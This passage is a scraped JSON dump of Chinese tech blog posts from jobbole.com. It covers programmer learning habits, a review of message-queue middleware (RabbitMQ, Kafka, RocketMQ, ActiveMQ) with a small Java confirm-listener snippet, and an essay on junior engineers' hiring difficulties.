找到解决方案之后，还要花几分钟时间探寻问题根源。可以查找背景资料，以便自己下次遇到同类型的问题时可以举一反三。,\n,\n,\n,\n,1.9, 看几分钟书，敲几行代码就开始刷知乎和朋友圈,\n,\n,做事情不专注，注意力不能集中，这也是学习的大忌。可以利用番茄工作法，给自己一段时间专注于某件事情，这样可以极大地提高 自己的工作效率。,\n,\n,\n,\n,1.10, 从不看书，所有问题的解决方案都从论坛，Q群和Google中来,\n,\n,认为看书效率太低，而且收益也不高，看书需要大量的时间，而且看完感觉也没太大的用，不如直接Google和Q群来得容易。 如果你真的这样想过，我只想说「小伙子，你思想很危险！」,\n,\n,\n,\n,\n,2, 一些学习的好习惯,\n,\n,2.1, 与其反复阅读，不如经常回顾,\n,\n,与其一遍又一遍地阅读重复的书籍，编写同样的「Hello World」，不如有意识地总结回顾看过的书，学过的知识。 只需要每晚趟在床上的时候，回想一下今天都学到了什么？今天自己有进步一点点吗？,\n,\n,\n,\n,2.2, 多做练习，多写代码，从错误中学习,\n,\n,看技术书籍要多写书中的代码，在初学阶段哪怕对着书本敲也没有什么问题。认真完成书中留的习题，在自己没有尽最大努力的情况下面不要去看答案。 不要怕犯错，每一次犯错都是自己进步的机会。不断地测试自己是最好的学习方法，不管是「刻意练习」还是「10000小时定律」，都要求我们通过不断地 实践来巩固我们的所学，从而让自己成为大师。,\n,\n,\n,\n,2.3, 多总结问题的解决方案，多写可复用的代码，拒绝复制粘贴,\n,\n,每天把工作中遇到问题的解决方案总结一下，想想为什么要这么做，是什么导致了这个BUG，导致BUG的根本原因是什么。 是自己的逻辑混乱，粗心大意，还是程序框架太复杂？做需求的时候，要尽量避免复制粘贴，不要让代码里面有重复代码。 Don’t Repeat Yourself! Don’t Repeat Yourself! Don’t Repeat Yourself! 「重要的事情说三遍！」,\n,\n,\n,\n,2.4, 对于自己想要学习的内容，制订一下计划，有节奏地学习,\n,\n,我是一个非常爱学习的人，但是有时候还是感觉学习不够高效。经常会由于一些突发情况把原本的学习计划打乱，导致学习效果打折扣。 因为学习一个东西最怕三天打渔，如果能够持续地学习一个东西，我可以把它学习地很好。这时候，我就得结合我自身的情况，选择一段最佳的 学习时间，在这段学习时间里我可以不被打扰，保持高度专注。比如每天早上6.30起床看一个小时书。,\n,\n,\n,\n,2.5, 尝试使用不同的方式来解决一个问题,\n,\n,在遇到一个没有显而易见解决方案的问题时，你可能费了好大功夫想出一个方案，但是千万要记得，该方案不一定是最优的， 而且很大可能还存在一个更佳的方法。而这个方法只需要你退后一步，换个思路，或者与同事讨论一下就可以得出。 这也是我为什么非常喜欢别人 Review 我的代码的原因，因为别人能看到我代码中存在的不足。另外，有些时候，对现有的方案做一些 「微创新」也能使原本普通的方案变得不普通。,\n,另外，习惯了面向对象，何不尝尝函数式编程？每年学习一门新的不同范式的编程语言，可以极大地开拓你的眼界，给你一些不一样的解题思路。,\n,\n,\n,\n,2.6, 注意劳逸结合,\n,\n,多参加体育锻炼，多去户外走走，运动能够增强人的记忆力，并且有时候还能产生灵感。 如果身体不好，比如颈椎不好，下了班你就只想葛优躺了，因为你的本能告诉你，我不能再写代码了，会挂的。。。 想要成为大神，身体好是前提条件。有人30岁成为大神，我资质不好，我35岁成为大神总可以吧。 切莫在30岁的时候就把身体弄跨了，然后35岁转行了，永远失去了成长为大神的机会。,\n,\n,\n,\n,2.7, 向别人解释你的知识，多与人讨论,\n,\n,多写博客，多分享自己的所学所思，这些对于学习者自身也是非常有益的。通过用别人能够理解的语言来解释你学到的东西， 本身就要求你对该知识充分理解。另外，很多人经常感叹「跟你讨论一下，我马上变得有思路了」，这其实就是交流的作用。,\n,\n,\n,\n,2.8, 保持学习的专注,\n,\n,很多知识没有足够的专注力和足够多的时间是很难学好的，保持学习的专注尤其重要。 因为人的大脑在专注模式下面，神经细胞更活跃，你学的东西更容易从短期记忆变成中长期记忆。 而且在高度专注下面，你的解决问题的能力也会提高，原本看起来复杂的东西，在专注面前说不定就不是事了。,\n,\n,\n,\n,2.9, 找到自己的短板并补足自己的短板,\n,\n,发现并找到自己的不足相对来说是比较容易的，但是要补齐短板就非常不易了。 因为人总是有畏难思想的，拖延症是怎么来的，就是你的大脑出于本能去做一些让自己分泌更多多巴胺的事情。 如果自己英语不好，就要下决心把英语攻克。如果自己数学不行，就要下死力气掌握数学。 补齐短板就像渡劫，越早渡劫，越快升仙。,\n,\n,\n,\n,2.10, 给自己设计学习奖励,\n,\n,比如学好了 3D 数学，就给自己买一台顶配 MacBookPro 之类的。为什么游戏可以让你上瘾，因为它有反馈，有奖励机制。 学习数学是非常枯燥的，如果有了这个奖励机制，也许自己就更容易坚持了呢。,\n,PS：这一点对于有家室的程序员有用，你想学好什么，要获得什么奖励，你可以当着你老婆的面立个FLAG,\n,\n,\n,\n,\n,3, 小结,\n,\n,Coursera 的这门MOOC 《Learning How to Learn》 强烈推荐给每一伴热爱学习的小伙伴，也欢迎大家给我留言，分享你的学习感悟。,\n,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 10 收藏,\n\n                    , 3 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114034/", "url_object_id": "4138e1905de02770bdfcad265c9040f4", "front_image_path": "full/23173d6ca86d727a81c2d7e88a6d0158f93860e7.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/4bae6998d00f180d42c7da716e3d0bb2.jpg"], "title": "分布式之消息队列复习精讲", "create_time": "2018/05/21", "vote": "2", "bookmark": "9", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,孤独烟,   ,引言,\n,为什么写这篇文章?,\n,博主有两位朋友分别是小A和小B:,\n,\n,小A，工作于传统软件行业(某社保局的软件外包公司)，每天工作内容就是和产品聊聊需求，改改业务逻辑。再不然就是和运营聊聊天，写几个SQL，生成下报表。又或者接到客服的通知，某某功能故障了，改改数据，然后下班部署上线。每天过的都是这种生活，技术零成长。,\n,小B，工作于某国企，虽然能接触到一些中间件技术。然而，他只会订阅/发布消息。通俗点说，就是调调API。对为什么使用这些中间件啊？如何保证高可用啊？没有充分的认识。,\n,\n,庆幸的是两位朋友都很有上进心，于是博主写这篇文章，帮助他们复习一下关于消息队列中间件这块的要点,\n,复习要点,\n,本文大概围绕如下几点进行阐述:,\n,\n,为什么使用消息队列？,\n,使用消息队列有什么缺点?,\n,消息队列如何选型?,\n,如何保证消息队列是高可用的？,\n,如何保证消息不被重复消费?,\n,如何保证消费的可靠性传输?,\n,如何保证消息的顺序性？,\n,\n,我们围绕以上七点进行阐述。需要说明一下，本文不是《消息队列从入门到精通》这种课程，因此只是提供一个复习思路，而不是去教你们怎么调用消息队列的API。建议对消息队列不了解的人，去找点消息队列的博客看看，再看本文，收获更大,\n,正文,\n,1、为什么要使用消息队列?,\n,分析,:一个用消息队列的人，不知道为啥用，这就有点尴尬。没有复习这点，很容易被问蒙，然后就开始胡扯了。,\n,回答,:这个问题,咱只答三个最主要的应用场景(不可否认还有其他的，但是只答三个主要的),即以下六个字:,解耦、异步、削峰,\n,(1)解耦,\n,传统模式:,\n,\n传统模式的缺点：,\n,\n,系统间耦合性太强，如上图所示，系统A在代码中直接调用系统B和系统C的代码，如果将来D系统接入，系统A还需要修改代码，过于麻烦！,\n,\n,中间件模式:,\n,\n中间件模式的的优点：,\n,\n,将消息写入消息队列，需要消息的系统自己从消息队列中订阅，从而系统A不需要做任何修改。,\n,\n,(2)异步,\n,传统模式:,\n,\n传统模式的缺点：,\n,\n,一些非必要的业务逻辑以同步的方式运行，太耗费时间。,\n,\n,中间件模式:,\n,\n中间件模式的的优点：,\n,\n,将消息写入消息队列，非必要的业务逻辑以异步的方式运行，加快响应速度,\n,\n,(3)削峰,\n,传统模式,\n,\n传统模式的缺点：,\n,\n,并发量大的时候，所有的请求直接怼到数据库，造成数据库连接异常,\n,\n,中间件模式:,\n,\n中间件模式的的优点：,\n,\n,系统A慢慢的按照数据库能处理的并发量，从消息队列中慢慢拉取消息。在生产中，这个短暂的高峰期积压是允许的。,\n,\n,2、使用了消息队列会有什么缺点?,\n,分析,:一个使用了MQ的项目，如果连这个问题都没有考虑过，就把MQ引进去了，那就给自己的项目带来了风险。我们引入一个技术，要对这个技术的弊端有充分的认识，才能做好预防。,要记住，不要给公司挖坑！,\n,回答,:回答也很容易，从以下两个个角度来答,\n,\n,系统可用性降低,:你想啊，本来其他系统只要运行好好的，那你的系统就是正常的。现在你非要加个消息队列进去，那消息队列挂了，你的系统不是呵呵了。因此，系统可用性降低,\n,系统复杂性增加,:要多考虑很多方面的问题，比如一致性问题、如何保证消息不被重复消费，如何保证保证消息可靠传输。因此，需要考虑的东西更多，系统复杂性增大。,\n,\n,但是，我们该用还是要用的。,\n,3、消息队列如何选型?,\n,先说一下，博主只会ActiveMQ,RabbitMQ,RocketMQ,Kafka，对什么ZeroMQ等其他MQ没啥理解，因此只能基于这四种MQ给出回答。,\n,分析,:既然在项目中用了MQ，肯定事先要对业界流行的MQ进行调研，如果连每种MQ的优缺点都没了解清楚，就拍脑袋依据喜好，用了某种MQ，还是给项目挖坑。如果面试官问:”你为什么用这种MQ？。”你直接回答”领导决定的。”这种回答就很LOW了。,还是那句话，不要给公司挖坑。,\n,回答,:首先，咱先上,ActiveMQ的社区,，看看该MQ的更新频率:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nApache ActiveMQ 5.15.3 Release\r\nChristopher L. Shannon posted on Feb 12, 2018\r\nApache ActiveMQ 5.15.2 Released\r\nChristopher L. Shannon posted on Oct 23, 2017\r\nApache ActiveMQ 5.15.0 Released\r\nChristopher L. Shannon posted on Jul 06, 2017\r\n省略以下记录\r\n...,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Apache ,ActiveMQ, ,5.15.3, ,Release,Christopher, ,L,., ,Shannon ,posted ,on ,Feb, ,12,,, ,2018,Apache ,ActiveMQ, ,5.15.2, ,Released,Christopher, ,L,., ,Shannon ,posted ,on ,Oct, ,23,,, ,2017,Apache ,ActiveMQ, ,5.15.0, ,Released,Christopher, ,L,., ,Shannon ,posted ,on ,Jul, ,06,,, ,2017,省略以下记录,.,.,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们可以看出，ActiveMq几个月才发一次版本，据说研究重心在他们的下一代产品Apollo。,\n接下来，我们再去,RabbitMQ的社区,去看一下,RabbitMQ的更新频率,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nRabbitMQ 3.7.3 release  30 January 2018\r\nRabbitMQ 3.6.15 release  17 January 2018\r\nRabbitMQ 3.7.2 release23 December 2017\r\nRabbitMQ 3.7.1 release21 December 2017\r\n省略以下记录\r\n...,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,RabbitMQ, ,3.7.3, ,release,  ,30, ,January, ,2018,RabbitMQ, ,3.6.15, ,release,  ,17, ,January, ,2018,RabbitMQ, ,3.7.2, ,release23 ,December, ,2017,RabbitMQ, ,3.7.1, ,release21 ,December, ,2017,省略以下记录,.,.,.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们可以看出，RabbitMQ版本发布比ActiveMq频繁很多。至于RocketMQ和kafka就不带大家看了，总之也比ActiveMQ活跃的多。详情，可自行查阅。,\n再来一个性能对比表,\n,\n,\n,\n,特性,\n,ActiveMQ,\n,RabbitMQ,\n,RocketMQ,\n,kafka,\n,\n,\n,\n,\n,开发语言,\n,java,\n,erlang,\n,java,\n,scala,\n,\n,\n,单机吞吐量,\n,万级,\n,万级,\n,10万级,\n,10万级,\n,\n,\n,时效性,\n,ms级,\n,us级,\n,ms级,\n,ms级以内,\n,\n,\n,可用性,\n,高(主从架构),\n,高(主从架构),\n,非常高(分布式架构),\n,非常高(分布式架构),\n,\n,\n,功能特性,\n,成熟的产品，在很多公司得到应用；有较多的文档；各种协议支持较好,\n,基于erlang开发，所以并发能力很强，性能极其好，延时很低;管理界面较丰富,\n,MQ功能比较完备，扩展性佳,\n,只支持主要的MQ功能，像一些消息查询，消息回溯等功能没有提供，毕竟是为大数据准备的，在大数据领域应用广。,\n,\n,\n,\n,综合上面的材料得出以下两点:,\n(1)中小型软件公司，建议选RabbitMQ.一方面，erlang语言天生具备高并发的特性，而且他的管理界面用起来十分方便。正所谓，成也萧何，败也萧何！他的弊端也在这里，虽然RabbitMQ是开源的，然而国内有几个能定制化开发erlang的程序员呢？所幸，RabbitMQ的社区十分活跃，可以解决开发过程中遇到的bug，这点对于中小型公司来说十分重要。不考虑rocketmq和kafka的原因是，一方面中小型软件公司不如互联网公司，数据量没那么大，选消息中间件，应首选功能比较完备的，所以kafka排除。不考虑rocketmq的原因是，rocketmq是阿里出品，如果阿里放弃维护rocketmq，中小型公司一般抽不出人来进行rocketmq的定制化开发，因此不推荐。,\n(2)大型软件公司，根据具体使用在rocketMq和kafka之间二选一。一方面，大型软件公司，具备足够的资金搭建分布式环境，也具备足够大的数据量。针对rocketMQ,大型软件公司也可以抽出人手对rocketMQ进行定制化开发，毕竟国内有能力改JAVA源码的人，还是相当多的。至于kafka，根据业务场景选择，如果有日志采集功能，肯定是首选kafka了。具体该选哪个，看使用场景。,\n,4、如何保证消息队列是高可用的？,\n,分析,:在第二点说过了，引入消息队列后，系统的可用性下降。在生产中，没人使用单机模式的消息队列。因此，作为一个合格的程序员，应该对消息队列的高可用有很深刻的了解。如果面试的时候，面试官问，你们的消息中间件如何保证高可用的？你的回答只是表明自己只会订阅和发布消息，面试官就会怀疑你是不是只是自己搭着玩，压根没在生产用过。,请做一个爱思考，会思考，懂思考的程序员。,\n,回答,:这问题，其实要对消息队列的集群模式要有深刻了解，才好回答。,\n以rcoketMQ为例，他的集群就有多master 模式、多master多slave异步复制模式、多 master多slave同步双写模式。多master多slave模式部署架构图(网上找的,偷个懒，懒得画):,\n,\n其实博主第一眼看到这个图，就觉得和kafka好像，只是NameServer集群，在kafka中是用zookeeper代替，都是用来保存和发现master和slave用的。通信过程如下:,\nProducer 与 NameServer集群中的其中一个节点（随机选择）建立长连接，定期从 NameServer 获取 Topic 路由信息，并向提供 Topic 服务的 Broker Master 建立长连接，且定时向 Broker 发送心跳。Producer 只能将消息发送到 Broker master，但是 Consumer 则不一样，它同时和提供 Topic 服务的 Master 和 Slave建立长连接，既可以从 Broker Master 订阅消息，也可以从 Broker Slave 订阅消息。,\n那么kafka呢,为了对比说明直接上kafka的拓补架构图(也是找的，懒得画),\n,\n如上图所示，一个典型的Kafka集群中包含若干Producer（可以是web前端产生的Page View，或者是服务器日志，系统CPU、Memory等），若干broker（Kafka支持水平扩展，一般broker数量越多，集群吞吐率越高），若干Consumer Group，以及一个Zookeeper集群。Kafka通过Zookeeper管理集群配置，选举leader，以及在Consumer Group发生变化时进行rebalance。Producer使用push模式将消息发布到broker，Consumer使用pull模式从broker订阅并消费消息。,\n至于rabbitMQ,也有普通集群和镜像集群模式，自行去了解，比较简单，两小时即懂。,\n要求，在回答高可用的问题时，应该能逻辑清晰的画出自己的MQ集群架构或清晰的叙述出来。,\n,5、如何保证消息不被重复消费？,\n,分析,:这个问题其实换一种问法就是，如何保证消息队列的幂等性?这个问题可以认为是消息队列领域的基本问题。换句话来说，是在考察你的设计能力，这个问题的回答可以根据具体的业务场景来答，没有固定的答案。,\n,回答,:先来说一下为什么会造成重复消费?,\n其实无论是那种消息队列，造成重复消费原因其实都是类似的。正常情况下，消费者在消费消息时候，消费完毕后，会发送一个确认信息给消息队列，消息队列就知道该消息被消费了，就会将该消息从消息队列中删除。只是不同的消息队列发送的确认信息形式不同,例如RabbitMQ是发送一个ACK确认消息，RocketMQ是返回一个CONSUME_SUCCESS成功标志，kafka实际上有个offset的概念，简单说一下(如果还不懂，出门找一个kafka入门到精通教程),就是每一个消息都有一个offset，kafka消费过消息后，需要提交offset，让消息队列知道自己已经消费过了。那造成重复消费的原因?，就是因为网络传输等等故障，确认信息没有传送到消息队列，导致消息队列不知道自己已经消费过该消息了，再次将该消息分发给其他的消费者。,\n如何解决?这个问题针对业务场景来答分以下几点,\n(1)比如，你拿到这个消息做数据库的insert操作。那就容易了，给这个消息做一个唯一主键，那么就算出现重复消费的情况，就会导致主键冲突，避免数据库出现脏数据。,\n(2)再比如，你拿到这个消息做redis的set的操作，那就容易了，不用解决，因为你无论set几次结果都是一样的，set操作本来就算幂等操作。,\n(3)如果上面两种情况还不行，上大招。准备一个第三方介质,来做消费记录。以redis为例，给消息分配一个全局id，只要消费过该消息，将<id,message>以K-V形式写入redis。那消费者开始消费前，先去redis中查询有没消费记录即可。,\n,6、如何保证消费的可靠性传输?,\n,分析,:我们在使用消息队列的过程中，应该做到消息不能多消费，也不能少消费。如果无法做到可靠性传输，可能给公司带来千万级别的财产损失。同样的，如果可靠性传输在使用过程中，没有考虑到，这不是给公司挖坑么，你可以拍拍屁股走了，公司损失的钱，谁承担。还是那句话，,认真对待每一个项目，不要给公司挖坑。,\n,回答,:其实这个可靠性传输，每种MQ都要从三个角度来分析:生产者弄丢数据、消息队列弄丢数据、消费者弄丢数据,\n,RabbitMQ,\n,(1)生产者丢数据,\n从生产者弄丢数据这个角度来看，RabbitMQ提供transaction和confirm模式来确保生产者不丢消息。,\ntransaction机制就是说，发送消息前，开启事物(channel.txSelect())，然后发送消息，如果发送过程中出现什么异常，事物就会回滚(channel.txRollback())，如果发送成功则提交事物(channel.txCommit())。,\n然而缺点就是吞吐量下降了。因此，按照博主的经验，生产上用confirm模式的居多。一旦channel进入confirm模式，所有在该信道上面发布的消息都将会被指派一个唯一的ID(从1开始)，一旦消息被投递到所有匹配的队列之后，rabbitMQ就会发送一个Ack给生产者(包含消息的唯一ID)，这就使得生产者知道消息已经正确到达目的队列了.如果rabiitMQ没能处理该消息，则会发送一个Nack消息给你，你可以进行重试操作。处理Ack和Nack的代码如下所示（说好不上代码的，偷偷上了）:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchannel.addConfirmListener(new ConfirmListener() {  \r\n                <a href=\"http://www.jobbole.com/members/wx610506454\">@Override</a>  \r\n                public void handleNack(long deliveryTag, boolean multiple) throws IOException {  \r\n                    System.out.println(\"nack: deliveryTag = \"+deliveryTag+\" multiple: \"+multiple);  \r\n                }  \r\n                <a href=\"http://www.jobbole.com/members/wx610506454\">@Override</a>  \r\n                public void handleAck(long deliveryTag, boolean multiple) throws IOException {  \r\n                    System.out.println(\"ack: deliveryTag = \"+deliveryTag+\" multiple: \"+multiple);  \r\n                }  \r\n            });  ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,channel,.,addConfirmListener,(,new, ,ConfirmListener,(,), ,{,  ,                ,<,a, ,href,=,\"http://www.jobbole.com/members/wx610506454\",>,@,Override,<,/,a,>,  ,                ,public, ,void, ,handleNack,(,long, ,deliveryTag,,, ,boolean, ,multiple,), ,throws, ,IOException, ,{,  ,                    ,System,.,out,.,println,(,\"nack: deliveryTag = \",+,deliveryTag,+,\" multiple: \",+,multiple,),;,  ,                ,},  ,                ,<,a, ,href,=,\"http://www.jobbole.com/members/wx610506454\",>,@,Override,<,/,a,>,  ,                ,public, ,void, ,handleAck,(,long, ,deliveryTag,,, ,boolean, ,multiple,), ,throws, ,IOException, ,{,  ,                    ,System,.,out,.,println,(,\"ack: deliveryTag = \",+,deliveryTag,+,\" multiple: \",+,multiple,),;,  ,                ,},  ,            ,},),;,  ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,(2)消息队列丢数据,\n处理消息队列丢数据的情况，一般是开启持久化磁盘的配置。这个持久化配置可以和confirm机制配合使用，你可以在消息持久化磁盘后，再给生产者发送一个Ack信号。这样，如果消息持久化磁盘之前，rabbitMQ阵亡了，那么生产者收不到Ack信号，生产者会自动重发。,\n那么如何持久化呢，这里顺便说一下吧，其实也很容易，就下面两步,\n1、将queue的持久化标识durable设置为true,则代表是一个持久的队列,\n2、发送消息的时候将deliveryMode=2,\n这样设置以后，rabbitMQ就算挂了，重启后也能恢复数据,\n,(3)消费者丢数据,\n消费者丢数据一般是因为采用了自动确认消息模式。这种模式下，消费者会自动确认收到信息。这时rahbitMQ会立即将消息删除，这种情况下如果消费者出现异常而没能处理该消息，就会丢失该消息。,\n至于解决方案，采用手动确认消息即可。,\n,kafka,\n,这里先引一张kafka Replication的,数据流向图,\n,\nProducer在发布消息到某个Partition时，先通过ZooKeeper找到该Partition的Leader，然后无论该Topic的Replication Factor为多少（也即该Partition有多少个Replica），Producer只将该消息发送到该Partition的Leader。Leader会将该消息写入其本地Log。每个Follower都从Leader中pull数据。,\n针对上述情况，得出如下分析,\n,(1)生产者丢数据,\n在kafka生产中，基本都有一个leader和多个follwer。follwer会去同步leader的信息。因此，为了避免生产者丢数据，做如下两点配置,\n,\n,第一个配置要在producer端设置acks=all。这个配置保证了，follwer同步完成后，才认为消息发送成功。,\n,在producer端设置retries=MAX，一旦写入失败，这无限重试,\n,\n,(2)消息队列丢数据,\n针对消息队列丢数据的情况，无外乎就是，数据还没同步，leader就挂了，这时zookpeer会将其他的follwer切换为leader,那数据就丢失了。针对这种情况，应该做两个配置。,\n,\n,replication.factor参数，这个值必须大于1，即要求每个partition必须有至少2个副本,\n,min.insync.replicas参数，这个值必须大于1，这个是要求一个leader至少感知到有至少一个follower还跟自己保持联系,\n,\n,这两个配置加上上面生产者的配置联合起来用，基本可确保kafka不丢数据,\n,(3)消费者丢数据,\n这种情况一般是自动提交了offset，然后你处理程序过程中挂了。kafka以为你处理好了。再强调一次offset是干嘛的,\n,offset,：指的是kafka的topic中的每个消费组消费的下标。简单的来说就是一条消息对应一个offset下标，每次消费数据的时候如果提交offset，那么下次消费就会从提交的offset加一那里开始消费。,\n比如一个topic中有100条数据，我消费了50条并且提交了，那么此时的kafka服务端记录提交的offset就是49(offset从0开始)，那么下次消费的时候offset就从50开始消费。,\n解决方案也很简单，改成手动提交即可。,\n,ActiveMQ和RocketMQ,\n,大家自行查阅吧,\n,7、如何保证消息的顺序性？,\n,分析,:其实并非所有的公司都有这种业务需求，但是还是对这个问题要有所复习。,\n,回答,:针对这个问题，通过某种算法，将需要保持先后顺序的消息放到同一个消息队列中(kafka中就是partition,rabbitMq中就是queue)。然后只用一个消费者去消费该队列。,\n有的人会问:那如果为了吞吐量，有多个消费者去消费怎么办？,\n这个问题，没有固定回答的套路。比如我们有一个微博的操作，发微博、写评论、删除微博，这三个异步操作。如果是这样一个业务场景，那只要重试就行。比如你一个消费者先执行了写评论的操作，但是这时候，微博都还没发，写评论一定是失败的，等一段时间。等另一个消费者，先执行写评论的操作后，再执行，就可以成功。,\n总之，针对这个问题，我的观点是保证入队有序就行，出队以后的顺序交给消费者自己去保证，没有固定套路。,\n,总结,\n,写到这里，希望读者把本文提出的这几个问题，经过深刻的准备后，一般来说，能囊括大部分的消息队列的知识点。如果面试官不问这几个问题怎么办，简单，自己把几个问题讲清楚，突出以下自己考虑的全面性。,\n最后，其实我不太提倡这样突击复习，希望大家打好基本功，,做一个爱思考，懂思考，会思考的程序员,。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 9 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114016/", "url_object_id": "1b36123333a36dfc38deb859d6cb3ce6", "front_image_path": "full/117976068e2e847f1067d25ea3fa90a3b5a60f3f.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/03/1fd843979d2a6757332bedd49c9c8d80.png"], "title": "是什么让初级工程师走投无路？", "create_time": "2018/05/24", "vote": "1", "bookmark": "1", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,tsteho, 翻译，,艾凌风, 校稿。未经许可，禁止转载！,英文出处：,Melissa Mcewen,。欢迎加入,翻译组,。,虽然有非常多的初级工程师，但是并没有非常多的职位给他们。,\n,\n,几个月前，我参加了一场针对技术领域女性的活动。很多参加者中是新的开发者，毕业于编程学校或者计算机科学课程。几乎所有人都告诉我，她们在获得第一份工作时遇到了麻烦。,\n,我很幸运。我在大学的第一份“真正”工作是 2010 年哥伦比亚大学的“初级应用程序开发人员”。现如今，甚至找不到一个招聘初级开发者岗位的招聘帖。发这些招聘帖的人说他们被淹没在了简历中。然而优秀的公司又抱怨找不到好的工程师。,\n,我想知道这是为什么？,\n,我不知道这样做，具体来说能够为我们节省多少成本，毕竟我不参与公司的运营。但是我知道很多公司对我说过：「我们不雇佣初级工程师的原因是，,让高级工程师花时间给他们提供指导，对我们来说成本太高了,。」我已经了解高级工程师的价格，因为我就是其中之一，并且为了预估项目预算，项目经理曾让我给项目分配时间。我知道的价格区间是 190 ~ 300 美元每小时。这就是很多公司认为雇佣初级工程师是一笔损失的原因。,\n,我并不这么认为：没有高级工程师能够一直高效工作一整天。公司对人力成本的焦虑就像鳄鱼的眼泪，（至少以我的观点来说）他们刻意不去思考浪费在很多事物上的时间，比如开会。,\n,但让我们来做个假设，他们将初级开发者的职位重新加入到团队。另一个问题出现了：,高级工程师根本没有与初级工程师合作或者培训他人的经验,。当我第一次开始与初级工程师合作时，我不知道该如何去做。我感到迷茫和困惑。我所待的公司基本上就是这样的态度：“让他们有事可做，让他们可以从中学到东西。”但是，这样做真的不可持续。,\n,我寻找资源，但是并没有找到。如果你知道任何资源，请在留言中通知我。我最终拼凑了各种课程和不同作业。,\n,但令人惊叹的是，我在做这件事时学到了很多东西。直到我必须解释 Javascript 语言的特性，我才觉得我真的深入地理解了它们。我为教学开发的一些工具最终付诸于项目。,\n,现在，有一些时候令我感到沮丧。特别是当项目经理或其他经理不了解现实状况的时候。他们总觉得，这些人教了就马上能够进行开发，但这之间有个消化和理解的过程。,\n,我认为我想说的是：整个软件开发生态系统需要初级工程师以保持健康。培训他们有成本，但也有好处。,\n,我建议那些想要再次招聘初级工程师的公司，投入一些时间用来制定一个大纲，用来帮助高级工程师以及任何与他们合作的人员有效地辅导。并且说明下这个严峻的现实。,\n,就像,并不是所有初级工程师能够成为成功的开发者,。那样的话，你会做什么呢？抱怨辅导你的高级工程师？或者追逐那些奋斗于通往成功领域（如项目管理、销售工程师或者其他非开发的角色）的人。在这些领域，软件技能也是非常重要的。,\n,并且,并不是所有的高级工程师能够成为成功的导师,。很多杰出的工程师不具备这一特质。他们应该避免扮演这样的角色。对于那些必须担任导师这一角色的人，如果他们没做好，我们也不应该苛责他们。我曾在一个团队中给初级开发者提供大部分的指导。与其他工程师所做的工作相比，这被认为不是“真正”的工作，这后来也让我不太愿意担当这个角色。是的，我会将性别考虑进去，因为我是一位女性，并且当女性担任类似这种角色，受刻板印象的影响，她们总被认为是“训导员”。那意味着更低的声誉，更低的声誉意味着更少的工资。,\n,话虽这么说，但如果没有提及一些其他阻碍初级工程师的经济问题，我不足以写下这篇文章。最近，因为一个活动，我拜访了一家公司，他们大概的意思就是说，现在所有“容易”的工作都已外包给另一个国家。这些工作以前都是初级工程师做的。之后有了自动化。我还是初级工程师时许多需要亲自做的工作，现在都可以自动化处理了。,\n,对于那些初级工程师，找到你的第一份工作正变得越来越困难。你可能不得不做一些我不愿意推荐的事，比如免费给各种项目打工。,如果你确实选择了一个非常好的开源项目，你可以将它写到简历上,。我,不太倾向于推荐为“创业公司”免费打工,。,\n,你也要寻找你自己的导师。现场见面会是最好的方式，虽然我明白并不是每个人都喜欢这样，因此你可以试试 Slack 和 Discord 聊天应用。不过就像很多约会一样，这也会变得糟糕。你将被多次的拒绝。你将做一些糟糕的、甚至完全失败的项目，因为和商业项目的人员相比，免费项目的工作人员一般有点更古里古怪。就像一个初级工程师告诉我的：他们不再去某个见面会，因为他们之前做的项目彻底地失败了。我不得不告诉他们应该继续寻找项目，但心中要明白大多数项目都不是完善的。,\n,对我而言，我很高兴为参加见面会的人提供辅导。在这些背景下，我也要努力地制定一份更正式的导师计划。,\n,我不确定整个行业的解决方案是什么。我不确定缺乏初级工程师的公司是不平衡的还是聪明的。实际情况是，大多数软件开发人员不会长时间呆在一个地方，所以也许投入大量资源来培训人员是没有意义的。或者说，这个行业也许应该问问自己，为什么人们不停地跳槽？也许是因为大多数公司都很糟糕，或者对我们很多人来说，这是提高薪水的唯一途径。我可以等待一个愚蠢的、毫无意义的年度“绩效评估”让我涨 1％ 的工资。或者投递简历，通过面试，拿到 10％ 或更多的工资涨幅。,\n,这不仅仅是个别公司不够完善的信号，也是整个行业不够完善的信号。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        